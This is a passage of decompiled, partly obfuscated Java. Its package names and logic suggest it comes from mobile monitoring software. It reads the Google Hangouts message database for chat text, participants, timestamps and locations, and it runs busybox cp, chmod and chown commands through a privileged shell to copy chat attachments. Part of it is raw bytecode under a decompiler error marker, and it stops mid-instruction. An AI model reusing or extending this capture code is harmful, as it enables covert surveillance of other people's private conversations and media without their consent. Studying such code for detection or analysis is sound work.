    //   63	65	147	java/lang/Exception
    //   66	71	147	java/lang/Exception
    //   80	84	147	java/lang/Exception
    //   8	13	167	finally
    //   25	28	167	finally
    //   39	42	167	finally
    //   53	56	167	finally
    //   63	65	167	finally
    //   66	71	167	finally
    //   80	84	167	finally
    //   89	95	186	finally
    //   107	114	186	finally
    //   117	124	186	finally
    //   125	128	186	finally
    //   150	153	186	finally
    //   89	95	190	java/lang/Exception
    //   107	114	190	java/lang/Exception
    //   117	124	190	java/lang/Exception
    //   125	128	190	java/lang/Exception
  }
  
  private static String a(String paramString1, String paramString2)
  {
    Object localObject1 = null;
    boolean bool1 = com.vvt.ag.b.a(paramString1);
    Object localObject2;
    if (!bool1)
    {
      String str = c(paramString1);
      localObject2 = ImType.HANGOUTS;
      Object localObject3 = ImMediaFileType.ATTACHMENT;
      localObject2 = com.vvt.im.a.c.a(paramString2, (ImType)localObject2, (ImMediaFileType)localObject3);
      localObject3 = com.vvt.im.a.c.a(ImMediaFileType.ATTACHMENT);
      Object localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
      localObject4 = File.separator;
      localObject2 = (String)localObject4 + (String)localObject3;
      boolean bool2 = a;
      if (bool2) {}
      boolean bool3 = com.vvt.im.a.a.a(str, (String)localObject2);
      if (bool3) {
        break label120;
      }
      bool1 = a;
      if (!bool1) {}
    }
    for (;;)
    {
      return (String)localObject1;
      label120:
      localObject1 = localObject2;
    }
  }
  
  private static String a(String paramString1, String paramString2, ImType paramImType, ImMediaFileType paramImMediaFileType, String paramString3)
  {
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    String str1 = com.vvt.im.a.c.a(paramString1, paramImType, paramImMediaFileType);
    localObject1 = ((StringBuilder)localObject1).append(str1);
    str1 = File.separator;
    localObject1 = ((StringBuilder)localObject1).append(str1);
    str1 = com.vvt.im.a.c.a(paramImMediaFileType);
    localObject1 = str1;
    str1 = p.a(paramString1, "busybox");
    String str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
    int i = 7;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = str1;
    arrayOfObject[1] = paramString2;
    arrayOfObject[2] = localObject1;
    arrayOfObject[3] = localObject1;
    arrayOfObject[4] = paramString3;
    arrayOfObject[5] = paramString3;
    int j = 6;
    arrayOfObject[j] = localObject1;
    str1 = String.format(str2, arrayOfObject);
    try
    {
      KMShell.a(str1);
      boolean bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k((String)localObject1);
      }
      bool1 = a;
      if (!bool1) {}
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (bool2) {}
        bool2 = false;
        Object localObject2 = null;
      }
    }
    return (String)localObject1;
  }
  
  private static String a(String paramString1, String paramString2, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str = b(paramString1, paramString3);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.im.a.a.a(paramString2, str);
    if (bool2) {}
    for (;;)
    {
      return str;
      bool1 = false;
      str = null;
    }
  }
  
  private static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    Object localObject = null;
    boolean bool2 = com.vvt.ag.b.a(paramString3);
    if (!bool2)
    {
      bool2 = a;
      if (bool2) {}
      bool2 = ShellUtil.b(paramString3);
      if (bool2)
      {
        localObject = ImType.HANGOUTS;
        ImMediaFileType localImMediaFileType = ImMediaFileType.ATTACHMENT;
        localObject = a(paramString1, paramString3, (ImType)localObject, localImMediaFileType, paramString4);
      }
    }
    bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return (String)localObject;
  }
  
  /* Error */
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, long paramLong1, long paramLong2, String paramString2, com.vvt.base.b paramb)
  {
    // Byte code:
    //   0: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   3: istore 8
    //   5: iload 8
    //   7: ifeq +3 -> 10
    //   10: new 306	java/util/ArrayList
    //   13: astore 9
    //   15: aload 9
    //   17: invokespecial 307	java/util/ArrayList:<init>	()V
    //   20: aconst_null
    //   21: astore 10
    //   23: dconst_0
    //   24: dstore 11
    //   26: lconst_0
    //   27: lstore 13
    //   29: dconst_0
    //   30: dstore 15
    //   32: new 309	java/text/SimpleDateFormat
    //   35: astore 17
    //   37: aload 17
    //   39: ldc_w 311
    //   42: invokespecial 312	java/text/SimpleDateFormat:<init>	(Ljava/lang/String;)V
    //   45: ldc 21
    //   47: astore 18
    //   49: iconst_0
    //   50: istore 19
    //   52: aconst_null
    //   53: astore 20
    //   55: iconst_0
    //   56: istore 21
    //   58: aconst_null
    //   59: astore 22
    //   61: iconst_0
    //   62: istore 23
    //   64: aconst_null
    //   65: astore 24
    //   67: aconst_null
    //   68: astore 25
    //   70: aconst_null
    //   71: astore 26
    //   73: aconst_null
    //   74: astore 27
    //   76: ldc_w 314
    //   79: astore 28
    //   81: aload_0
    //   82: astore 29
    //   84: aload_0
    //   85: aload 18
    //   87: aconst_null
    //   88: aconst_null
    //   89: aconst_null
    //   90: aconst_null
    //   91: aconst_null
    //   92: aconst_null
    //   93: aload 28
    //   95: invokevirtual 33	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   98: astore 29
    //   100: new 100	java/lang/StringBuilder
    //   103: astore 18
    //   105: aload 18
    //   107: invokespecial 103	java/lang/StringBuilder:<init>	()V
    //   110: ldc_w 316
    //   113: astore 20
    //   115: aload 18
    //   117: aload 20
    //   119: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   122: pop
    //   123: ldc 41
    //   125: astore 20
    //   127: aload 18
    //   129: aload 20
    //   131: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   134: astore 20
    //   136: ldc_w 318
    //   139: astore 22
    //   141: aload 20
    //   143: aload 22
    //   145: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   148: pop
    //   149: ldc_w 320
    //   152: astore 20
    //   154: aload 18
    //   156: aload 20
    //   158: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   161: astore 20
    //   163: ldc_w 318
    //   166: astore 22
    //   168: aload 20
    //   170: aload 22
    //   172: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   175: pop
    //   176: ldc_w 322
    //   179: astore 20
    //   181: aload 18
    //   183: aload 20
    //   185: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   188: astore 20
    //   190: ldc_w 318
    //   193: astore 22
    //   195: aload 20
    //   197: aload 22
    //   199: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   202: pop
    //   203: ldc_w 324
    //   206: astore 20
    //   208: aload 18
    //   210: aload 20
    //   212: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   215: astore 20
    //   217: ldc_w 318
    //   220: astore 22
    //   222: aload 20
    //   224: aload 22
    //   226: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   229: pop
    //   230: ldc_w 326
    //   233: astore 20
    //   235: aload 18
    //   237: aload 20
    //   239: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   242: astore 20
    //   244: ldc_w 318
    //   247: astore 22
    //   249: aload 20
    //   251: aload 22
    //   253: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   256: pop
    //   257: ldc_w 328
    //   260: astore 20
    //   262: aload 18
    //   264: aload 20
    //   266: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   269: astore 20
    //   271: ldc_w 318
    //   274: astore 22
    //   276: aload 20
    //   278: aload 22
    //   280: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   283: pop
    //   284: ldc -18
    //   286: astore 20
    //   288: aload 18
    //   290: aload 20
    //   292: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   295: astore 20
    //   297: ldc_w 318
    //   300: astore 22
    //   302: aload 20
    //   304: aload 22
    //   306: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   309: pop
    //   310: aload 29
    //   312: ifnull +202 -> 514
    //   315: ldc_w 330
    //   318: astore 20
    //   320: aload 29
    //   322: aload 20
    //   324: invokeinterface 45 2 0
    //   329: istore 19
    //   331: iload 19
    //   333: iflt +30 -> 363
    //   336: ldc_w 330
    //   339: astore 20
    //   341: aload 18
    //   343: aload 20
    //   345: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   348: astore 20
    //   350: ldc_w 318
    //   353: astore 22
    //   355: aload 20
    //   357: aload 22
    //   359: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   362: pop
    //   363: ldc_w 332
    //   366: astore 20
    //   368: aload 29
    //   370: aload 20
    //   372: invokeinterface 45 2 0
    //   377: istore 19
    //   379: iload 19
    //   381: iflt +30 -> 411
    //   384: ldc_w 332
    //   387: astore 20
    //   389: aload 18
    //   391: aload 20
    //   393: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   396: astore 20
    //   398: ldc_w 318
    //   401: astore 22
    //   403: aload 20
    //   405: aload 22
    //   407: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   410: pop
    //   411: ldc_w 334
    //   414: astore 20
    //   416: aload 29
    //   418: aload 20
    //   420: invokeinterface 45 2 0
    //   425: istore 19
    //   427: iload 19
    //   429: iflt +30 -> 459
    //   432: ldc_w 334
    //   435: astore 20
    //   437: aload 18
    //   439: aload 20
    //   441: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   444: astore 20
    //   446: ldc_w 318
    //   449: astore 22
    //   451: aload 20
    //   453: aload 22
    //   455: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   458: pop
    //   459: ldc_w 336
    //   462: astore 20
    //   464: aload 29
    //   466: aload 20
    //   468: invokeinterface 45 2 0
    //   473: istore 19
    //   475: iload 19
    //   477: iflt +30 -> 507
    //   480: ldc_w 336
    //   483: astore 20
    //   485: aload 18
    //   487: aload 20
    //   489: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   492: astore 20
    //   494: ldc_w 318
    //   497: astore 22
    //   499: aload 20
    //   501: aload 22
    //   503: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   506: pop
    //   507: aload 29
    //   509: invokeinterface 53 1 0
    //   514: ldc_w 338
    //   517: astore 20
    //   519: aload 18
    //   521: aload 20
    //   523: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   526: pop
    //   527: ldc_w 340
    //   530: astore 20
    //   532: aload 18
    //   534: aload 20
    //   536: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   539: pop
    //   540: ldc 21
    //   542: astore 20
    //   544: aload 18
    //   546: aload 20
    //   548: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   551: pop
    //   552: ldc_w 342
    //   555: astore 20
    //   557: aload 18
    //   559: aload 20
    //   561: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   564: astore 20
    //   566: ldc 41
    //   568: astore 22
    //   570: aload 20
    //   572: aload 22
    //   574: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   577: astore 20
    //   579: ldc_w 344
    //   582: astore 22
    //   584: aload 20
    //   586: aload 22
    //   588: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   591: astore 20
    //   593: ldc 41
    //   595: astore 22
    //   597: aload 20
    //   599: aload 22
    //   601: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   604: astore 20
    //   606: ldc_w 346
    //   609: astore 22
    //   611: aload 20
    //   613: aload 22
    //   615: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   618: pop
    //   619: ldc_w 338
    //   622: astore 20
    //   624: aload 18
    //   626: aload 20
    //   628: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   631: astore 20
    //   633: ldc_w 348
    //   636: astore 22
    //   638: aload 20
    //   640: aload 22
    //   642: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   645: pop
    //   646: ldc_w 338
    //   649: astore 20
    //   651: aload 18
    //   653: aload 20
    //   655: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   658: astore 20
    //   660: ldc_w 350
    //   663: astore 22
    //   665: aload 20
    //   667: aload 22
    //   669: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   672: pop
    //   673: ldc_w 352
    //   676: astore 20
    //   678: aload 18
    //   680: aload 20
    //   682: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   685: astore 20
    //   687: ldc 41
    //   689: astore 22
    //   691: aload 20
    //   693: aload 22
    //   695: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   698: astore 20
    //   700: ldc_w 354
    //   703: astore 22
    //   705: aload 20
    //   707: aload 22
    //   709: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   712: pop
    //   713: ldc_w 356
    //   716: astore 20
    //   718: aload 18
    //   720: aload 20
    //   722: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   725: pop
    //   726: aload 18
    //   728: invokevirtual 138	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   731: astore 18
    //   733: iconst_3
    //   734: istore 19
    //   736: iload 19
    //   738: anewarray 125	java/lang/String
    //   741: astore 20
    //   743: iconst_0
    //   744: istore 21
    //   746: aconst_null
    //   747: astore 22
    //   749: lload_2
    //   750: invokestatic 361	java/lang/Long:toString	(J)Ljava/lang/String;
    //   753: astore 24
    //   755: aload 20
    //   757: iconst_0
    //   758: aload 24
    //   760: aastore
    //   761: iconst_1
    //   762: istore 21
    //   764: lload 4
    //   766: invokestatic 361	java/lang/Long:toString	(J)Ljava/lang/String;
    //   769: astore 24
    //   771: aload 20
    //   773: iload 21
    //   775: aload 24
    //   777: aastore
    //   778: iconst_2
    //   779: istore 21
    //   781: iconst_m1
    //   782: iconst_1
    //   783: iushr
    //   784: istore 23
    //   786: iload 23
    //   788: invokestatic 27	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   791: astore 24
    //   793: aload 20
    //   795: iload 21
    //   797: aload 24
    //   799: aastore
    //   800: aload_0
    //   801: aload 18
    //   803: aload 20
    //   805: invokevirtual 225	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   808: astore 27
    //   810: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   813: istore 8
    //   815: iload 8
    //   817: ifeq +3 -> 820
    //   820: aload 27
    //   822: ifnull +1199 -> 2021
    //   825: dload 15
    //   827: dstore 30
    //   829: dload 11
    //   831: dstore 32
    //   833: iconst_0
    //   834: istore 8
    //   836: aconst_null
    //   837: astore 29
    //   839: aconst_null
    //   840: astore 25
    //   842: aload 27
    //   844: invokeinterface 70 1 0
    //   849: istore 21
    //   851: iload 21
    //   853: ifeq +1168 -> 2021
    //   856: ldc 41
    //   858: astore 22
    //   860: aload 27
    //   862: aload 22
    //   864: invokeinterface 45 2 0
    //   869: istore 21
    //   871: aload 27
    //   873: iload 21
    //   875: invokeinterface 365 2 0
    //   880: istore 34
    //   882: ldc_w 320
    //   885: astore 22
    //   887: aload 27
    //   889: aload 22
    //   891: invokeinterface 45 2 0
    //   896: istore 21
    //   898: aload 27
    //   900: iload 21
    //   902: invokeinterface 233 2 0
    //   907: astore 26
    //   909: ldc_w 326
    //   912: astore 22
    //   914: aload 27
    //   916: aload 22
    //   918: invokeinterface 45 2 0
    //   923: istore 21
    //   925: aload 27
    //   927: iload 21
    //   929: invokeinterface 49 2 0
    //   934: lstore 35
    //   936: lconst_0
    //   937: lstore 13
    //   939: dconst_0
    //   940: dstore 15
    //   942: lload 35
    //   944: lload 13
    //   946: lcmp
    //   947: istore 37
    //   949: iload 37
    //   951: ifle +1164 -> 2115
    //   954: ldc2_w 366
    //   957: lstore 13
    //   959: ldc2_w 368
    //   962: dstore 15
    //   964: lload 35
    //   966: lload 13
    //   968: ldiv
    //   969: lstore 35
    //   971: lload 35
    //   973: lstore 38
    //   975: ldc_w 324
    //   978: astore 22
    //   980: aload 27
    //   982: aload 22
    //   984: invokeinterface 45 2 0
    //   989: istore 21
    //   991: aload 27
    //   993: iload 21
    //   995: invokeinterface 233 2 0
    //   1000: astore 40
    //   1002: new 371	java/util/Date
    //   1005: astore 22
    //   1007: aload 22
    //   1009: lload 38
    //   1011: invokespecial 374	java/util/Date:<init>	(J)V
    //   1014: aload 17
    //   1016: aload 22
    //   1018: invokevirtual 377	java/text/SimpleDateFormat:format	(Ljava/util/Date;)Ljava/lang/String;
    //   1021: astore 41
    //   1023: ldc_w 322
    //   1026: astore 22
    //   1028: aload 27
    //   1030: aload 22
    //   1032: invokeinterface 45 2 0
    //   1037: istore 21
    //   1039: aload 27
    //   1041: iload 21
    //   1043: invokeinterface 233 2 0
    //   1048: astore 42
    //   1050: ldc_w 328
    //   1053: astore 22
    //   1055: aload 27
    //   1057: aload 22
    //   1059: invokeinterface 45 2 0
    //   1064: istore 21
    //   1066: aload 27
    //   1068: iload 21
    //   1070: invokeinterface 233 2 0
    //   1075: astore 43
    //   1077: ldc -18
    //   1079: astore 22
    //   1081: aload 27
    //   1083: aload 22
    //   1085: invokeinterface 45 2 0
    //   1090: istore 21
    //   1092: aload 27
    //   1094: iload 21
    //   1096: invokeinterface 233 2 0
    //   1101: astore 22
    //   1103: ldc_w 338
    //   1106: astore 24
    //   1108: aload 27
    //   1110: aload 24
    //   1112: invokeinterface 45 2 0
    //   1117: istore 23
    //   1119: aload 27
    //   1121: iload 23
    //   1123: invokeinterface 365 2 0
    //   1128: istore 44
    //   1130: ldc_w 330
    //   1133: astore 24
    //   1135: aload 27
    //   1137: aload 24
    //   1139: invokeinterface 45 2 0
    //   1144: istore 45
    //   1146: iconst_m1
    //   1147: istore 23
    //   1149: iload 45
    //   1151: iload 23
    //   1153: if_icmpeq +14 -> 1167
    //   1156: aload 27
    //   1158: iload 45
    //   1160: invokeinterface 233 2 0
    //   1165: astore 25
    //   1167: aload 22
    //   1169: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1172: istore 23
    //   1174: iload 23
    //   1176: ifeq +99 -> 1275
    //   1179: aload 25
    //   1181: ifnull +94 -> 1275
    //   1184: iconst_0
    //   1185: istore 23
    //   1187: aconst_null
    //   1188: astore 24
    //   1190: bipush 9
    //   1192: istore 37
    //   1194: iload 23
    //   1196: iload 37
    //   1198: if_icmpge +77 -> 1275
    //   1201: ldc2_w 379
    //   1204: lstore 13
    //   1206: ldc2_w 381
    //   1209: dstore 15
    //   1211: lload 13
    //   1213: invokestatic 387	android/os/SystemClock:sleep	(J)V
    //   1216: new 100	java/lang/StringBuilder
    //   1219: astore 22
    //   1221: aload 22
    //   1223: invokespecial 103	java/lang/StringBuilder:<init>	()V
    //   1226: aload 22
    //   1228: iload 34
    //   1230: invokevirtual 390	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1233: astore 22
    //   1235: ldc -96
    //   1237: astore 46
    //   1239: aload 22
    //   1241: aload 46
    //   1243: invokevirtual 134	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   1246: astore 22
    //   1248: aload 22
    //   1250: invokevirtual 138	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1253: astore 22
    //   1255: aload 22
    //   1257: aload_0
    //   1258: invokestatic 393	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase;)Ljava/lang/String;
    //   1261: astore 22
    //   1263: aload 22
    //   1265: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1268: istore 37
    //   1270: iload 37
    //   1272: ifne +187 -> 1459
    //   1275: ldc_w 332
    //   1278: astore 24
    //   1280: aload 27
    //   1282: aload 24
    //   1284: invokeinterface 45 2 0
    //   1289: istore 23
    //   1291: iconst_m1
    //   1292: istore 37
    //   1294: iload 23
    //   1296: iload 37
    //   1298: if_icmpeq +810 -> 2108
    //   1301: aload 27
    //   1303: iload 23
    //   1305: invokeinterface 397 2 0
    //   1310: dstore 32
    //   1312: dload 32
    //   1314: dstore 11
    //   1316: ldc_w 334
    //   1319: astore 24
    //   1321: aload 27
    //   1323: aload 24
    //   1325: invokeinterface 45 2 0
    //   1330: istore 23
    //   1332: iconst_m1
    //   1333: istore 47
    //   1335: iload 23
    //   1337: iload 47
    //   1339: if_icmpeq +762 -> 2101
    //   1342: aload 27
    //   1344: iload 23
    //   1346: invokeinterface 397 2 0
    //   1351: dstore 30
    //   1353: dload 30
    //   1355: dstore 15
    //   1357: ldc_w 336
    //   1360: astore 18
    //   1362: aload 27
    //   1364: aload 18
    //   1366: invokeinterface 45 2 0
    //   1371: istore 48
    //   1373: iconst_m1
    //   1374: istore 19
    //   1376: iload 48
    //   1378: iload 19
    //   1380: if_icmpeq +714 -> 2094
    //   1383: aload 27
    //   1385: iload 48
    //   1387: invokeinterface 233 2 0
    //   1392: astore 29
    //   1394: aload 29
    //   1396: astore 10
    //   1398: new 306	java/util/ArrayList
    //   1401: astore 29
    //   1403: aload 29
    //   1405: invokespecial 307	java/util/ArrayList:<init>	()V
    //   1408: iload 44
    //   1410: invokestatic 400	com/vvt/capture/hangouts/d:a	(I)Lcom/vvt/capture/hangouts/HangoutsData$Direction;
    //   1413: astore 24
    //   1415: ldc_w 402
    //   1418: astore 18
    //   1420: aload 26
    //   1422: aload 18
    //   1424: invokevirtual 405	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   1427: istore 48
    //   1429: iload 48
    //   1431: ifeq +37 -> 1468
    //   1434: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1437: istore 8
    //   1439: iload 8
    //   1441: ifeq +638 -> 2079
    //   1444: dload 15
    //   1446: dstore 30
    //   1448: aload 10
    //   1450: astore 29
    //   1452: dload 11
    //   1454: dstore 32
    //   1456: goto -614 -> 842
    //   1459: iload 23
    //   1461: iconst_1
    //   1462: iadd
    //   1463: istore 23
    //   1465: goto -275 -> 1190
    //   1468: aload 40
    //   1470: invokestatic 407	com/vvt/ag/removeFromPath:e	(Ljava/lang/String;)Ljava/lang/String;
    //   1473: astore 18
    //   1475: aload 18
    //   1477: invokestatic 413	android/text/Html:fromHtml	(Ljava/lang/String;)Landroid/text/Spanned;
    //   1480: astore 18
    //   1482: aload 18
    //   1484: invokevirtual 414	java/lang/Object:toString	()Ljava/lang/String;
    //   1487: astore 28
    //   1489: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1492: istore 48
    //   1494: iload 48
    //   1496: ifeq +3 -> 1499
    //   1499: iconst_m1
    //   1500: istore 48
    //   1502: iload 45
    //   1504: iload 48
    //   1506: if_icmpeq +63 -> 1569
    //   1509: aload 28
    //   1511: aload 25
    //   1513: aload 43
    //   1515: invokestatic 417	com/vvt/capture/hangouts/d:removeFromPath	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/im/events/MessageType;
    //   1518: astore 18
    //   1520: getstatic 423	com/vvt/im/events/MessageType:Text	Lcom/vvt/im/events/MessageType;
    //   1523: astore 20
    //   1525: aload 18
    //   1527: aload 20
    //   1529: if_acmpne +61 -> 1590
    //   1532: aload 28
    //   1534: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1537: istore 19
    //   1539: iload 19
    //   1541: ifeq +49 -> 1590
    //   1544: getstatic 12	com/vvt/capture/hangouts/d:a	Z
    //   1547: istore 8
    //   1549: iload 8
    //   1551: ifeq +528 -> 2079
    //   1554: dload 15
    //   1556: dstore 30
    //   1558: aload 10
    //   1560: astore 29
    //   1562: dload 11
    //   1564: dstore 32
    //   1566: goto -724 -> 842
    //   1569: aload 22
    //   1571: ifnull +11 -> 1582
    //   1574: getstatic 426	com/vvt/im/events/MessageType:none	Lcom/vvt/im/events/MessageType;
    //   1577: astore 18
    //   1579: goto -59 -> 1520
    //   1582: getstatic 423	com/vvt/im/events/MessageType:Text	Lcom/vvt/im/events/MessageType;
    //   1585: astore 18
    //   1587: goto -67 -> 1520
    //   1590: aload_0
    //   1591: aload_1
    //   1592: aload 6
    //   1594: invokestatic 429	com/vvt/capture/hangouts/d:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Lcom/vvt/im/events/info/d;
    //   1597: astore 40
    //   1599: aload_0
    //   1600: aload 42
    //   1602: invokestatic 432	com/vvt/capture/hangouts/d:removeFromPath	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/im/events/info/f;
    //   1605: astore 42
    //   1607: new 306	java/util/ArrayList
    //   1610: astore 20
    //   1612: aload 20
    //   1614: invokespecial 307	java/util/ArrayList:<init>	()V
    //   1617: aload_0
    //   1618: aload_1
    //   1619: aload 26
    //   1621: aload 40
    //   1623: invokestatic 435	com/vvt/capture/hangouts/d:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;Lcom/vvt/im/events/info/d;)Ljava/util/List;
    //   1626: astore 43
    //   1628: aload 26
    //   1630: aload 43
    //   1632: aload 40
    //   1634: aload_0
    //   1635: invokestatic 438	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Ljava/util/List;Lcom/vvt/im/events/info/d;Landroid/database/sqlite/SQLiteDatabase;)Lcom/vvt/im/events/info/removeFromPath;
    //   1638: astore 49
    //   1640: new 440	com/vvt/im/events/info/MyUncaughtExceptionHandler
    //   1643: astore 50
    //   1645: aload 50
    //   1647: invokespecial 441	com/vvt/im/events/info/MyUncaughtExceptionHandler:<init>	()V
    //   1650: aload 50
    //   1652: aload 10
    //   1654: invokevirtual 442	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)V
    //   1657: aload 50
    //   1659: dload 15
    //   1661: invokevirtual 445	com/vvt/im/events/info/MyUncaughtExceptionHandler:removeFromPath	(D)V
    //   1664: aload 50
    //   1666: dload 11
    //   1668: invokevirtual 447	com/vvt/im/events/info/MyUncaughtExceptionHandler:a	(D)V
    //   1671: aload 22
    //   1673: invokestatic 98	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   1676: istore 19
    //   1678: iload 19
    //   1680: ifne +251 -> 1931
    //   1683: ldc_w 449
    //   1686: astore 20
    //   1688: aload 25
    //   1690: aload 20
    //   1692: invokevirtual 453	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   1695: istore 19
    //   1697: iload 19
    //   1699: ifne +232 -> 1931
    //   1702: iload 34
    //   1704: invokestatic 455	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   1707: astore 20
    //   1709: aload_1
    //   1710: astore 29
    //   1712: aload 7
    //   1714: astore 26
    //   1716: aload_1
    //   1717: aload 18
    //   1719: aload 20
    //   1721: aload 22
    //   1723: aload 24
    //   1725: aload 25
    //   1727: aload 7
    //   1729: invokestatic 458	com/vvt/capture/hangouts/d:a	(Ljava/lang/String;Lcom/vvt/im/events/MessageType;Ljava/lang/String;Ljava/lang/String;Lcom/vvt/capture/hangouts/HangoutsData$Direction;Ljava/lang/String;Lcom/vvt/base/removeFromPath;)Ljava/util/List;
    //   1732: astore 20
    //   1734: aload 20
    //   1736: invokeinterface 109 1 0
    //   1741: istore 8
    //   1743: iload 8
    //   1745: ifne +323 -> 2068
    //   1748: getstatic 423	com/vvt/im/events/MessageType:Text	Lcom/vvt/im/events/MessageType;
    //   1751: astore 18
    //   1753: getstatic 89	com/vvt/capture/hangouts/HangoutsData$Direction:OUT	Lcom/vvt/capture/hangouts/HangoutsData$Direction;
    //   1756: astore 29
    //   1758: aload 24
    //   1760: aload 29
    //   1762: if_acmpne +161 -> 1923
    //   1765: ldc_w 460
    //   1768: astore 29
    //   1770: aload 20
